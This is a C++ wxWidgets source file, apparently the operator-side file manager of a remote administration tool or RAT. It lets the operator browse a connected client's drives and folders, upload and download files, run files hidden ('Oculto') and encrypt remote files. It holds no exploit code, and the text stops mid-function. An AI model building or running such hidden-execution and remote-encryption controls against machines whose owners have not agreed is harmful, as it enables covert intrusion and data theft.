#include "panel_file_manager.hpp"
#include "frame_client.hpp"
#include "file_editor.hpp"
#include "file_encryption.hpp"
#include "server.hpp"
#include "misc.hpp"

extern Servidor* p_Servidor;
extern std::mutex vector_mutex;

wxBEGIN_EVENT_TABLE(panelFileManager, wxFrame)
	EVT_MENU(wxID_ANY, panelFileManager::OnToolBarClick)
	EVT_BUTTON(wxID_ANY, panelFileManager::OnPath)
wxEND_EVENT_TABLE()

wxBEGIN_EVENT_TABLE(ListCtrlManager, wxListCtrl)
	EVT_MENU(EnumMenuFM::ID_New_Folder, ListCtrlManager::OnCrearFolder)
	EVT_MENU(EnumMenuFM::ID_New_Archivo, ListCtrlManager::OnCrearArchivo)
	EVT_MENU(EnumMenuFM::ID_Eliminar, ListCtrlManager::OnBorrarArchivo)
	EVT_MENU(EnumMenuFM::ID_Editar, ListCtrlManager::OnEditarArchivo)
	EVT_MENU(EnumMenuFM::ID_Exec_Visible, ListCtrlManager::OnEjecutarArchivo_Visible)
	EVT_MENU(EnumMenuFM::ID_Exec_Oculto, ListCtrlManager::OnEjecutarArchivo_Oculto)
	EVT_MENU(EnumMenuFM::ID_Descargar, ListCtrlManager::OnDescargarArchivo)
	EVT_MENU(EnumMenuFM::ID_Renombrar, ListCtrlManager::OnRenombrarArchivo)
	EVT_MENU(EnumMenuFM::ID_Crypt, ListCtrlManager::OnEncriptarArchivo)
	EVT_CONTEXT_MENU(ListCtrlManager::OnContextMenu)
	EVT_LIST_ITEM_ACTIVATED(EnumIDS::ID_Panel_FM_List, ListCtrlManager::OnActivated)
wxEND_EVENT_TABLE()

//panelFileManager::panelFileManager(wxWindow* pParent, SOCKET sck, std::string _strID, std::string _strIP, ByteArray c_key) :
//	wxFrame(pParent, wxID_ANY, "[" + _strID + "] Admin archivos", wxDefaultPosition, wxDefaultSize){
//	
//	this->SetName(_strID + "-FM");
//	this->sckCliente = sck;
//	this->strID = _strID;
//	this->strIP = _strIP;
//	this->enc_key = c_key;
//	
//	this->p_ToolBar = new wxToolBar(this, wxID_ANY, wxDefaultPosition, wxSize(30, wxDefaultSize.GetHeight()), wxTB_VERTICAL | wxTB_LEFT);
//	
//	//Imagenes por https://www.flaticon.com/authors/freepik
//	wxBitmap pcBitmap(wxT(".\\imgs\\computer.png"), wxBITMAP_TYPE_PNG);      
//	wxBitmap desktopBitmap(wxT(".\\imgs\\desktop.png"), wxBITMAP_TYPE_PNG);  
//	wxBitmap downloadBitmap(wxT(".\\imgs\\download.png"), wxBITMAP_TYPE_PNG);
//	wxBitmap refreshBitmap(wxT(".\\imgs\\refresh.png"), wxBITMAP_TYPE_PNG);  
//	wxBitmap uploadBitmap(wxT(".\\imgs\\upload.png"), wxBITMAP_TYPE_PNG);   
//	
//
//	this->p_ToolBar->AddTool(EnumIDS::ID_Panel_FM_Equipo, wxT("Equipo"), pcBitmap, "Equipo");
//	this->p_ToolBar->AddSeparator();
//	this->p_ToolBar->AddTool(EnumIDS::ID_Panel_FM_Escritorio, wxT("Escritorio"), desktopBitmap, "Escritorio");
//	this->p_ToolBar->AddSeparator();
//	this->p_ToolBar->AddTool(EnumIDS::ID_Panel_FM_Descargas, wxT("Descargas"), downloadBitmap, "Descargas");
//	this->p_ToolBar->AddSeparator();
//	this->p_ToolBar->AddTool(EnumIDS::ID_Panel_FM_Refresh, wxT("Refrescar"), refreshBitmap, wxT("Refrescar"));
//	this->p_ToolBar->AddSeparator();
//	this->p_ToolBar->AddTool(EnumIDS::ID_Panel_FM_Subir, wxT("Subir"), uploadBitmap, "Subir archivo a ruta actual");
//	this->p_ToolBar->Realize();
//
//	this->CrearLista();
//
//	this->p_RutaActual = new wxStaticText(this, EnumIDS::ID_Panel_FM_LblRuta, wxT("\\"), wxDefaultPosition, wxDefaultSize);
//	
//	wxBoxSizer* sizer2 = new wxBoxSizer(wxVERTICAL);
//	sizer2->Add(this->listManager, 1, wxEXPAND | wxALL);
//	sizer2->AddSpacer(5);
//	sizer2->Add(this->p_RutaActual, 0, wxEXPAND | wxALL);
//
//	wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);
//	sizer->Add(this->p_ToolBar, 0, wxEXPAND | wxALL);
//	sizer->AddSpacer(5);
//	sizer->Add(sizer2, 1, wxEXPAND | wxALL);
//
//	this->SetSizer(sizer);
//
//}

panelFileManager::panelFileManager(wxWindow* pParent, SOCKET sck, std::string _strID, std::string _strIP, ByteArray c_key):
 wxFrame(pParent, wxID_ANY, "[" + _strID + "] Admin archivos", wxDefaultPosition, wxSize(700, 500)){
	int PADDING = 5;

	this->SetName(_strID + "-FM");
	this->sckCliente = sck;
	this->strID = _strID;
	this->strIP = _strIP;
	this->enc_key = c_key;

	this->p_ToolBar = new wxToolBar(this, wxID_ANY, wxDefaultPosition, wxDefaultSize, wxTB_HORIZONTAL | wxTB_TOP | wxTB_TEXT);

	//Imagenes por https://www.flaticon.com/authors/freepik
	wxBitmap pcBitmap(wxT(".\\imgs\\computer.png"), wxBITMAP_TYPE_PNG);
	wxBitmap desktopBitmap(wxT(".\\imgs\\desktop.png"), wxBITMAP_TYPE_PNG);
	wxBitmap downloadBitmap(wxT(".\\imgs\\download.png"), wxBITMAP_TYPE_PNG);
	wxBitmap refreshBitmap(wxT(".\\imgs\\refresh.png"), wxBITMAP_TYPE_PNG);
	
	wxBitmap upArrow(wxT(".\\imgs\\back.png"), wxBITMAP_TYPE_PNG);
	wxBitmap goArrow(wxT(".\\imgs\\arrow-pointing-to-right.png"), wxBITMAP_TYPE_PNG);
	wxBitmap newFile(wxT(".\\imgs\\plus-symbol-button.png"), wxBITMAP_TYPE_PNG);
	wxBitmap newFolder(wxT(".\\imgs\\folder.png"), wxBITMAP_TYPE_PNG);
	wxBitmap uploadBitmap(wxT(".\\imgs\\upload.png"), wxBITMAP_TYPE_PNG);
	wxBitmap deleteBitmap(wxT(".\\imgs\\trash-can.png"), wxBITMAP_TYPE_PNG);
	
	wxBitmap documentsBitmap(wxT(".\\imgs\\documents-folder.png"), wxBITMAP_TYPE_PNG);
	
	this->p_ToolBar->AddTool(EnumMenuFM::ID_New_Archivo, wxT("Nuevo Archivo"), newFile, "Nuevo Archivo");
	this->p_ToolBar->AddSeparator();
	this->p_ToolBar->AddTool(EnumMenuFM::ID_New_Folder, wxT("Nueva Carpeta"), newFolder, "Nueva Carpeta");
	this->p_ToolBar->AddSeparator();
	this->p_ToolBar->AddTool(EnumIDS::ID_Panel_FM_Subir, wxT("Subir Archivo"), uploadBitmap, "Subir Archivo");
	this->p_ToolBar->AddSeparator();
	this->p_ToolBar->AddTool(EnumIDS::ID_Panel_FM_Refresh, wxT("Refrescar"), refreshBitmap, "Refrescar");
	this->p_ToolBar->AddSeparator();
	this->p_ToolBar->AddTool(EnumMenuFM::ID_Eliminar, wxT("Eliminar"), deleteBitmap, "Eliminar");
	this->p_ToolBar->Realize();

	//boton para subir carpeta (regresar) 
	//texto editable de ruta actual
	//boton para ir a ruta del texto

	wxPanel* pnl_Up = new wxPanel(this);
	wxButton* btn_Up = new wxButton(pnl_Up, EnumIDS::ID_Panel_FM_Subir_Ruta, "" , wxDefaultPosition, wxSize(30, 25));
	wxButton* btn_Go = new wxButton(pnl_Up, EnumIDS::ID_Panel_FM_Ir, "", wxDefaultPosition, wxSize(30, 25));
	this->txt_Path = new wxTextCtrl(pnl_Up, wxID_ANY, "\\");
	btn_Up->SetBitmap(upArrow);
	btn_Go->SetBitmap(goArrow);

	wxBoxSizer* top_Sizer = new wxBoxSizer(wxHORIZONTAL);

	top_Sizer->AddSpacer(PADDING);
	top_Sizer->Add(btn_Up, 0);
	top_Sizer->AddSpacer(PADDING);
	top_Sizer->Add(txt_Path, 1, wxALL);
	top_Sizer->AddSpacer(PADDING);
	top_Sizer->Add(btn_Go, 0);
	top_Sizer->AddSpacer(PADDING);

	pnl_Up->SetSizer(top_Sizer);

	//Panel lateral izquierdo
	//botones de acceso directo a folders especiales
	// Mejor otro toolbar para botones con imagene

	wxPanel* pnl_Left = new wxPanel(this);
	wxToolBar* left_toolbar = new wxToolBar(pnl_Left, wxID_ANY, wxDefaultPosition, wxDefaultSize, wxTB_VERTICAL | wxTB_TOP | wxTB_TEXT | wxTB_FLAT | wxTB_HORZ_TEXT);
	left_toolbar->AddTool(EnumIDS::ID_Panel_FM_Equipo, wxT("Equipo"), pcBitmap, "Equipo");
	left_toolbar->AddSeparator();
	left_toolbar->AddTool(EnumIDS::ID_Panel_FM_Escritorio, wxT("Escritorio"), desktopBitmap, "Escritorio");
	left_toolbar->AddSeparator();
	left_toolbar->AddTool(EnumIDS::ID_Panel_FM_Descargas, wxT("Descargas"), downloadBitmap, "Descargas");
	left_toolbar->AddSeparator();
	left_toolbar->AddTool(EnumIDS::ID_Panel_FM_Documentos, wxT("Documentos"), documentsBitmap, wxT("Documentos"));
	left_toolbar->Realize();

	wxBoxSizer* left_sizer = new wxBoxSizer(wxVERTICAL);
	left_sizer->AddSpacer(PADDING);
	left_sizer->Add(left_toolbar, 0, wxALL);

	pnl_Left->SetSizer(left_sizer);


	//Panel inferior derecho
	//listctrl (admin archivos)
	//txt de log inferior
	wxPanel* pnl_Down = new wxPanel(this);
	this->CrearLista(pnl_Down);
	//this->listManager->SetParent(pnl_Down);
	this->txt_Log = new wxTextCtrl(pnl_Down, wxID_ANY, "", wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxHSCROLL | wxTE_READONLY);

	wxBoxSizer* down_sizer = new wxBoxSizer(wxVERTICAL);

	down_sizer->AddSpacer(PADDING);
	down_sizer->Add(this->listManager, 1, wxALL | wxEXPAND);
	down_sizer->AddSpacer(PADDING);
	down_sizer->Add(txt_Log, 0, wxEXPAND);

	pnl_Down->SetSizer(down_sizer);


	wxBoxSizer* bottom_sizer = new wxBoxSizer(wxHORIZONTAL);

	bottom_sizer->AddSpacer(PADDING);
	bottom_sizer->Add(pnl_Left, 0, wxALL);
	bottom_sizer->AddSpacer(PADDING);
	bottom_sizer->Add(pnl_Down, 1, wxALL | wxEXPAND);
	bottom_sizer->AddSpacer(PADDING);


	wxBoxSizer* main_Sizer = new wxBoxSizer(wxVERTICAL);

	main_Sizer->Add(this->p_ToolBar, 0, wxALL);
	main_Sizer->Add(pnl_Up, 0, wxALL | wxEXPAND);
	main_Sizer->AddSpacer(PADDING);
	main_Sizer->Add(bottom_sizer, 1, wxALL | wxEXPAND);
	main_Sizer->AddSpacer(PADDING);

	this->SetSizer(main_Sizer);
	this->SetBackgroundColour(pnl_Up->GetBackgroundColour());

	this->SetMinSize(this->GetSize());
}


void panelFileManager::OnToolBarClick(wxCommandEvent& event) {
	std::string strComando = "";
	switch (event.GetId()) {
		case EnumIDS::ID_Panel_FM_Equipo:
			//ENVIAR COMANDO OBTENER DRIVES
			this->listManager->DeleteAllItems();
			this->iMODE = FM_EQUIPO;
			strComando = DUMMY_PARAM;
			
			this->listManager->Enable(false);
			this->listManager->MostrarCarga();

			this->EnviarComando(strComando, EnumComandos::FM_Discos);
			break;
		case EnumIDS::ID_Panel_FM_Descargas:
			//ENVIAR COMANDO OBTENER FOLDER DESCARGAS
			this->listManager->DeleteAllItems();
			this->iMODE = FM_NORMAL;
			strComando = "DESCAR-DOWN";

			this->listManager->Enable(false);
			this->listManager->MostrarCarga();

			this->EnviarComando(strComando, EnumComandos::FM_Dir_Folder);
			break;
		case EnumIDS::ID_Panel_FM_Escritorio:
			//ENVIAR COMANDO OBTENER FOLDER DE ESCRITORIO
			this->listManager->DeleteAllItems();
			this->iMODE = FM_NORMAL;
			strComando = "ESCRI-DESK";

			this->listManager->Enable(false);
			this->listManager->MostrarCarga();

			this->EnviarComando(strComando, EnumComandos::FM_Dir_Folder);
			break;
		case EnumIDS::ID_Panel_FM_Documentos:
			//ENVIAR COMANDO OBTENER FOLDER DE DOCUMENTOS
			this->listManager->DeleteAllItems();
			this->iMODE = FM_NORMAL;
			strComando = "DOCU";

			this->listManager->Enable(false);
			this->listManager->MostrarCarga();

			this->EnviarComando(strComando, EnumComandos::FM_Dir_Folder);
			break;
		case EnumIDS::ID_Panel_FM_Refresh:
			this->listManager->DeleteAllItems();
			strComando = this->txt_Path->GetValue();
			
			this->listManager->Enable(false);
			this->listManager->MostrarCarga();
			
			this->EnviarComando(strComando, EnumComandos::FM_Dir_Folder);
			break;
		case EnumMenuFM::ID_New_Archivo:
			this->listManager->OnCrearArchivo(event);
			break;
		case EnumMenuFM::ID_New_Folder:
			this->listManager->OnCrearFolder(event);
			break;
		case EnumMenuFM::ID_Eliminar:
			this->listManager->OnBorrarArchivo(event);
			break;
		case EnumIDS::ID_Panel_FM_Subir:
			wxFileDialog dialog(this, "Seleccionar archivo a enviar", wxEmptyString, wxEmptyString, wxFileSelectorDefaultWildcardStr, wxFD_OPEN | wxFD_FILE_MUST_EXIST);
			if (dialog.ShowModal() == wxID_OK) {
				std::string strTID = this->strID;
				std::string strRutaLocal = dialog.GetPath();
				std::string strRutaRemota = this->txt_Path->GetValue();
				strRutaRemota += dialog.GetFilename();
				std::thread thEnviar([this, strRutaLocal, strRutaRemota, strTID] {
					this->EnviarArchivo(strRutaLocal, strRutaRemota.c_str(), strTID);
				});
				thEnviar.detach();
			}
			break;
	}
}

void panelFileManager::OnPath(wxCommandEvent& event) {
	wxString strPath = this->txt_Path->GetValue();

	if (strPath.length() >= 3) {
		if (event.GetId() == EnumIDS::ID_Panel_FM_Ir) {
			std::string strTempPath= std::string(strPath.ToStdString());
			const char* cPath = strTempPath.c_str();
			this->ActualizarRuta(cPath);
		} else if (event.GetId() == EnumIDS::ID_Panel_FM_Subir_Ruta) {
			if (this->c_RutaActual.size() == 1) {
				//Raiz del dispositivo
				return;
			}
			this->c_RutaActual.pop_back();
			this->txt_Path->SetValue(this->RutaActual());
		}

		this->listManager->DeleteAllItems();
		std::string strCommand = this->RutaActual();
		this->listManager->Enable(false);
		this->listManager->MostrarCarga();
		this->EnviarComando(strCommand, EnumComandos::FM_Dir_Folder);
	}
}

void panelFileManager::CrearLista(wxWindow* pParent) {
	this->listManager = new ListCtrlManager(pParent, EnumIDS::ID_Panel_FM_List, wxDefaultPosition, wxDefaultSize/*wxSize(FRAME_CLIENT_SIZE_WIDTH*3, FRAME_CLIENT_SIZE_WIDTH*3)*/, wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES, this->strID, this->strIP, this->sckCliente);
	this->listManager->SetName(this->strID + "-FM-LIST");

	//Spining circle
	this->listManager->m_indicator = new wxActivityIndicator(this->listManager, wxID_ANY, wxDefaultPosition, wxDefaultSize);
	this->listManager->m_indicator->Show(false);

	this->listManager->itemp = this;

	this->listManager->CargarImagenes();
}

void panelFileManager::EnviarComando(std::string pComando, int iComando) {
	p_Servidor->cChunkSend(this->sckCliente, pComando.c_str(), pComando.size(), 0, false, iComando, this->enc_key);
}

void panelFileManager::EnviarArchivo(const std::string lPath, const char* rPath, std::string strCliente) {
	DEBUG_MSG("Enviado " + lPath);

	std::ifstream localFile(lPath, std::ios::binary);
	if (!localFile.is_open()) {
		ERROR_EW("No se pudo abrir el archivo " + lPath);
		return;
	}

	u64 uTamArchivo = GetFileSize(lPath.c_str());
	u64 uBytesEnviados = 0;

	//////     AGREGAR TRANSFER AL VECTOR DEL SERVIDOR       /////////////
	// Solo para monitorear transferencia
	TransferStatus nuevo_transfer;
	Archivo_Descarga nuevo_archivo; //NULL
	nuevo_transfer.isUpload = true;
	nuevo_transfer.uTamano = uTamArchivo;
	nuevo_transfer.strNombre = lPath;
	nuevo_transfer.uDescargado = 0;
	
	int iClienteID = p_Servidor->IndexOf(strCliente);
	if (iClienteID == -1) {
		DEBUG_MSG("[X] No se pudo encontrar el cliente " + strCliente);
		return;
	}
	
	std::string strID = RandomID(4);

	p_Servidor->vc_Clientes[iClienteID]->Transfers_Insertar(strID, nuevo_archivo, nuevo_transfer);
	///////////////////////////////////////////////////////////////////////

	std::string strComando = rPath;
	strComando.append(1, CMD_DEL);
	strComando += std::to_string(uTamArchivo);
	strComando.append(1, CMD_DEL);
	strComando += strID;
	
	//Enviar ruta remota y tamaño de archivo
	p_Servidor->cChunkSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, true, EnumComandos::FM_Descargar_Archivo_Init, this->enc_key);
	
	int iBytesLeidos = 0;

	std::string strHeader = strID;
	strHeader.append(1, CMD_DEL);

	int iHeaderSize = strHeader.size();

	std::vector<char> nSendBuffer(PAQUETE_BUFFER_SIZE + iHeaderSize);
	if (nSendBuffer.size() == 0) {
		DEBUG_MSG("[0]No se pudo reservar memoria para enviar el archivo.");
		return;
	}

	memcpy(nSendBuffer.data(), strHeader.c_str(), iHeaderSize);

	while (1) {
		localFile.read(nSendBuffer.data() + iHeaderSize, PAQUETE_BUFFER_SIZE);
		iBytesLeidos = localFile.gcount();
		if (iBytesLeidos > 0) {
			iBytesLeidos += iHeaderSize;
			int iEnviado = p_Servidor->cChunkSend(this->sckCliente, nSendBuffer.data(), iBytesLeidos, 0, false, EnumComandos::FM_Descargar_Archivo_Recibir, this->enc_key);
			uBytesEnviados += iEnviado;
			if (iEnviado == SOCKET_ERROR || iEnviado == WSAECONNRESET) {
				break;
			}
			p_Servidor->vc_Clientes[iClienteID]->Transfers_IncreSize(strID, iEnviado);
		}else {
			break;
		}
	}
	
	localFile.close();

	int index = p_Servidor->vc_Clientes[iClienteID]->Transfers_Exists(strID);
	if (index != -1) {
		TransferStatus temp_tranfers = p_Servidor->vc_Clientes[iClienteID]->Transfer_Get(index);
		u64 udiff = temp_tranfers.uTamano - temp_tranfers.uDescargado;
		if (udiff > 0) {
			DEBUG_MSG("Error en transferencia");
			p_Servidor->vc_Clientes[iClienteID]->Transfers_IncreSize(strID, udiff);
		}
	}

	p_Servidor->vc_Clientes[iClienteID]->Transfers_Fin(strID);

	//Ya se envio todo, cerrar el archivo
	std::this_thread::sleep_for(std::chrono::milliseconds(500));
	p_Servidor->cChunkSend(this->sckCliente, strID.c_str(), strID.size(), 0, true, EnumComandos::FM_Descargar_Archivo_End, this->enc_key);
}

void panelFileManager::ActualizarRuta(const char*& pBuffer) {
	this->txt_Path->SetValue(wxString(pBuffer));

	std::vector<std::string> vcNuevaRuta = strSplit(std::string(pBuffer), '\\', 100);
	if (vcNuevaRuta.size() <= 0) { return; }

	this->c_RutaActual.clear();

	for (std::string& sub_path : vcNuevaRuta) {
		if (sub_path == "\\") { continue; }
		this->c_RutaActual.push_back(sub_path);
	}
}

wxString panelFileManager::RutaActual() {
	wxString strOut = "";
	for (auto item : this->c_RutaActual) {
		strOut += item;
		strOut.append('\\');
	}
	return strOut;
}

//#####################################################
//#####################################################
//        Acciones menu contextual
void ListCtrlManager::OnCrearFolder(wxCommandEvent& event) {
	wxTextEntryDialog dialog(this, "Nombre", "Crear folder/carpeta", "Nueva Carpeta", wxOK | wxCANCEL);
	if (dialog.ShowModal() == wxID_OK){
		std::string strComando = this->CarpetaActual();
		strComando += dialog.GetValue();
		this->itemp->EnviarComando(strComando, EnumComandos::FM_Crear_Folder);
	}
}

void ListCtrlManager::OnCrearArchivo(wxCommandEvent& event) {
	wxTextEntryDialog dialog(this, "Nombre", "Crear archivo", "LEEME.txt", wxOK | wxCANCEL);
	if (dialog.ShowModal() == wxID_OK) {
		std::string strComando = this->CarpetaActual();
		strComando += dialog.GetValue();
		this->itemp->EnviarComando(strComando, EnumComandos::FM_Crear_Archivo);
	}
}

void ListCtrlManager::OnBorrarArchivo(wxCommandEvent& event) {
	long item = this->GetNextItem(-1, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED);
	wxString strFile = this->GetItemText(item, 1);
	//wxDialog dialog(this, 10000, "Borrar arhivo", wxDefaultPosition, wxDefaultSize, wxYES_NO, "Seguro que quieres borrar el archivo: " + strFile);
	wxMessageDialog dialog(this, "Seguro que quieres borrar el archivo: " + strFile + "?", "Borrar archivo", wxCENTER | wxNO_DEFAULT | wxYES_NO | wxICON_QUESTION);
	if (dialog.ShowModal() == wxID_YES) {
		//Borrar archivo
		std::string strComando = this->CarpetaActual();
		strComando += strFile;
		this->itemp->EnviarComando(strComando, EnumComandos::FM_Borrar_Archivo);
		this->itemp->txt_Log->AppendText("[BORRANDO] " + strComando + "\n");
	}
}

void ListCtrlManager::OnDescargarArchivo(wxCommandEvent& event) {
	std::string strID = RandomID(3);
	std::string strComando = this->ArchivoSeleccionado();
	strComando.append(1, CMD_DEL);
	strComando += strID;

	//Agregar el archivo al vector del cliente pero solo el id
	//actualizar el tamaño al obtener la info del cliente
	long item = this->GetNextItem(-1, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED);
	std::string strNombre = this->strID;
	strNombre.append(1, '-');
	strNombre += this->GetItemText(item, 1);
	
	wxFileDialog dialog(this, "Guardar archivo", wxEmptyString, strNombre, wxFileSelectorDefaultWildcardStr, wxFD_SAVE | wxFD_OVERWRITE_PROMPT);

	if (dialog.ShowModal() != wxID_OK) {
		return;
	}

	struct TransferStatus nuevo_transfer;
	struct Archivo_Descarga nuevo_archivo;
	nuevo_archivo.ssOutFile = std::make_shared <std::ofstream>(dialog.GetPath().ToStdString(), std::ios::binary);
	nuevo_transfer.uDescargado = nuevo_transfer.uTamano = nuevo_archivo.uTamarchivo = nuevo_archivo.uDescargado = 0;
	nuevo_transfer.strNombre = nuevo_archivo.strNombre = this->GetItemText(item, 1);
	nuevo_transfer.isUpload = false;
	if(!nuevo_archivo.ssOutFile.get()->is_open()) {
		DEBUG_MSG("[X] No se pudo abrir el archivo " + strNombre);
		return;
	}

	int iClienteID = p_Servidor->IndexOf(this->strID);
	if (iClienteID == -1) {
		DEBUG_MSG("[X] No se pudo encontrar el cliente " + this->strID);
		return;
	}

	p_Servidor->vc_Clientes[iClienteID]->Transfers_Insertar(strID, nuevo_archivo, nuevo_transfer);

	this->itemp->EnviarComando(strComando, EnumComandos::FM_Descargar_Archivo);
	this->itemp->txt_Log->AppendText("[DESCARGANDO] " + this->ArchivoSeleccionado() + "\n");
}

void ListCtrlManager::OnEjecutarArchivo_Visible(wxCommandEvent& event) {
	std::string strComando = this->ArchivoSeleccionado();
	strComando.append(1, CMD_DEL);
	strComando.append(1, EXEC_VISIBLE);
	this->itemp->EnviarComando(strComando, EnumComandos::FM_Ejecutar_Archivo);
	this->itemp->txt_Log->AppendText("[EXEC-VISIBLE] " + strComando + "\n");
}

void ListCtrlManager::OnEjecutarArchivo_Oculto(wxCommandEvent& event) {
	std::string strComando = this->ArchivoSeleccionado();
	strComando.append(1, CMD_DEL);
	strComando.append(1, EXEC_OCULTO);
	this->itemp->EnviarComando(strComando, EnumComandos::FM_Ejecutar_Archivo);
	this->itemp->txt_Log->AppendText("[EXEC-OCULTO] " + strComando + "\n");
}

void ListCtrlManager::OnEditarArchivo(wxCommandEvent& event) {
	wxString strFile = this->ArchivoSeleccionado();
	wxEditForm* editor_txt = new wxEditForm(this, strFile, RandomID(4));
	editor_txt->Show(true);
}

void ListCtrlManager::OnRenombrarArchivo(wxCommandEvent& event) {
	//Obtener nombre del 
	long item = this->GetNextItem(-1, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED);
	wxString strFile = this->GetItemText(item, 1);

	wxTextEntryDialog dialog(this, "Nuevo Nombre", "Cambiar Nombre", strFile, wxOK | wxCANCEL);
	if (dialog.ShowModal() == wxID_OK) {
		std::string strComando = strFile;    //Nombre antiguo
		strComando.append(1, CMD_DEL);
		strComando += dialog.GetValue();     //Nuevo nombre
		strComando.append(1, CMD_DEL);
		strComando += this->CarpetaActual(); //Ruta actual
		this->itemp->EnviarComando(strComando, EnumComandos::FM_Renombrar_Archivo);
	}
}

void ListCtrlManager::OnEncriptarArchivo(wxCommandEvent& event) {
	frameEncryption* frm_crypt = new frameEncryption(this, this->ArchivoSeleccionado(), this->strID, this->strIP, this->sckCliente, this->itemp->enc_key);
	frm_crypt->Show(true);
}

//#####################################################

std::string ListCtrlManager::ArchivoSeleccionado() {
	long item = this->GetNextItem(-1, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED);
	std::string strFile = this->CarpetaActual();
	strFile += this->GetItemText(item, 1);
	return strFile;
}

std::string ListCtrlManager::CarpetaActual() {
	//std::string strCarpeta = this->itemp->p_RutaActual->GetLabelText();
	std::string strCarpeta = this->itemp->txt_Path->GetValue();
	return strCarpeta;
}

void ListCtrlManager::OnActivated(wxListEvent& event) {
	wxString strPath = "";
	wxString strSelected = "";
	wxListItem itemCol;
	std::string strCommand = "";
	switch (this->itemp->iMODE) {
		case FM_EQUIPO:
			this->itemp->c_RutaActual.clear();

			strPath = this->GetItemText(event.GetIndex(), 1) + ":";
			this->itemp->txt_Path->SetValue(strPath + "\\");
			this->itemp->c_RutaActual.push_back(strPath);
			strCommand = strPath;
			strCommand.append(1, '\\');

			this->ClearAll();
			itemCol.SetText("-");
			itemCol.SetWidth(20);
			itemCol.SetAlign(wxLIST_FORMAT_CENTRE);
			this->InsertColumn(0, itemCol);

			itemCol.SetText("Nombre");
			itemCol.SetWidth(150);
			itemCol.SetAlign(wxLIST_FORMAT_LEFT);
			this->InsertColumn(1, itemCol);

			itemCol.SetText("Tamaño");
			itemCol.SetWidth(80);
			this->InsertColumn(2, itemCol);

			itemCol.SetText("Fecha Mod");
			itemCol.SetWidth(100);
			this->InsertColumn(3, itemCol);

			itemCol.SetText("Tipo");
			itemCol.SetWidth(100);
			this->InsertColumn(4, itemCol);

			this->Enable(false);
			
			this->MostrarCarga();
			
			this->itemp->EnviarComando(strCommand, EnumComandos::FM_Dir_Folder);
			this->itemp->iMODE = FM_NORMAL;
			break;
		case FM_NORMAL:
			if (this->GetItemText(event.GetIndex(), 2) == wxString("-")) {
				//Folder
				strSelected = this->GetItemText(event.GetIndex(), 1);
				
				this->itemp->c_RutaActual.push_back(strSelected);

				this->itemp->txt_Path->SetValue(this->itemp->RutaActual());

				this->DeleteAllItems();

				strCommand = this->itemp->RutaActual();

				this->Enable(false); 
					
				this->MostrarCarga();

				this->itemp->EnviarComando(strCommand, EnumComandos::FM_Dir_Folder);
				
			}
			break;
		default:
			break;
	}
}

void ListCtrlManager::ShowContextMenu(const wxPoint& pos, bool isFolder) {
	wxMenu menu;

	if (!isFolder) {
		wxMenu *exec_Menu = new wxMenu;
		exec_Menu->Append(EnumMenuFM::ID_Exec_Visible, "Normal");
		exec_Menu->Append(EnumMenuFM::ID_Exec_Oculto, "Oculto");

		wxMenu* new_menu = new wxMenu;
		new_menu->Append(EnumMenuFM::ID_New_Folder, "Folder/Carpeta");
		new_menu->Append(EnumMenuFM::ID_New_Archivo, "Archivo");

		menu.AppendSubMenu(new_menu, "Nuevo");
		menu.AppendSubMenu(exec_Menu, "Ejecutar");
		menu.Append(EnumMenuFM::ID_Descargar, "Descargar");
		menu.Append(EnumMenuFM::ID_Editar, "Editar");
		menu.Append(EnumMenuFM::ID_Renombrar, "Renombrar");
		menu.AppendSeparator();
		menu.Append(EnumMenuFM::ID_Crypt, "Crypt");
		menu.Append(EnumMenuFM::ID_Eliminar, "Eliminar");

		PopupMenu(&menu, pos.x, pos.y);
	} else {
		//pop menu para folder
		wxMenu* new_menu = new wxMenu;
		new_menu->Append(EnumMenuFM::ID_New_Folder, "Folder/Carpeta");
		new_menu->Append(EnumMenuFM::ID_New_Archivo, "Archivo");

		menu.AppendSubMenu(new_menu, "Nuevo");
		if (this->GetSelectedItemCount() > 0) {
			menu.Append(EnumMenuFM::ID_Renombrar, "Renombrar");
		}
		menu.AppendSeparator();
		menu.Append(EnumMenuFM::ID_Eliminar, "Eliminar");

		PopupMenu(&menu, pos.x, pos.y);
	}
}

void ListCtrlManager::OnContextMenu(wxContextMenuEvent& event)
{
	if (GetEditControl() == NULL)
	{
		wxPoint point = event.GetPosition();

		// If from keyboard
		if ((point.x == -1) && (point.y == -1))
		{
			wxSize size = GetSize();
			point.x = size.x / 2;
			point.y = size.y / 2;
		}
		else
		{
			point = ScreenToClient(point);
		}

		int flags;
		long iItem = HitTest(point, flags);

		if (iItem == -1) {
			ShowContextMenu(point, true);
			return;
		}

		ShowContextMenu(point, (this->GetItemText(iItem, 2) == "-") ? true : false);

	}else {
		event.Skip();
	}
}

//void ListCtrlManager::ListarDir(const std::vector<std::string> vcEntrys, const wxString strSize) {
void ListCtrlManager::ListarDir(const char* strData) {
	//Listar directorio
	//4 columnas para listar dir
	std::unique_lock<std::mutex> lock(this->mtx_fm);

	if (this->GetColumnCount() != 5) {
		wxListItem itemCol;
		this->ClearAll();
		itemCol.SetText("-");
		itemCol.SetWidth(20);
		itemCol.SetAlign(wxLIST_FORMAT_CENTRE);
		this->InsertColumn(0, itemCol);

		itemCol.SetText("Nombre");
		itemCol.SetWidth(150);
		itemCol.SetAlign(wxLIST_FORMAT_LEFT);
		this->InsertColumn(1, itemCol);

		itemCol.SetText("Tamaño");
		itemCol.SetWidth(80);
		this->InsertColumn(2, itemCol);

		itemCol.SetText("Fecha Mod");
		itemCol.SetWidth(100);
		this->InsertColumn(3, itemCol);

		itemCol.SetText("Tipo");
		itemCol.SetWidth(140);
		this->InsertColumn(5, itemCol);
	}

	for (std::string vcEntry : strSplit(std::string(strData), '|', 10000)) {
		std::vector<std::string> vcFileEntry;
		wxString strTama = "-";
		if (vcEntry[1] == '>') {
			//Dir
			vcFileEntry = strSplit(vcEntry, '>', 5);
		}else if (vcEntry[1] == '<') {
			//file
			vcFileEntry = strSplit(vcEntry, '<', 5);
			if (vcFileEntry.size() == 5) {
				u64 bytes = StrToUint(vcFileEntry[2].c_str());
				const char* cDEN = "BKMGTP";
				double factor = floor((vcFileEntry[2].size() - 1) / 3);
				char cBuf[20];
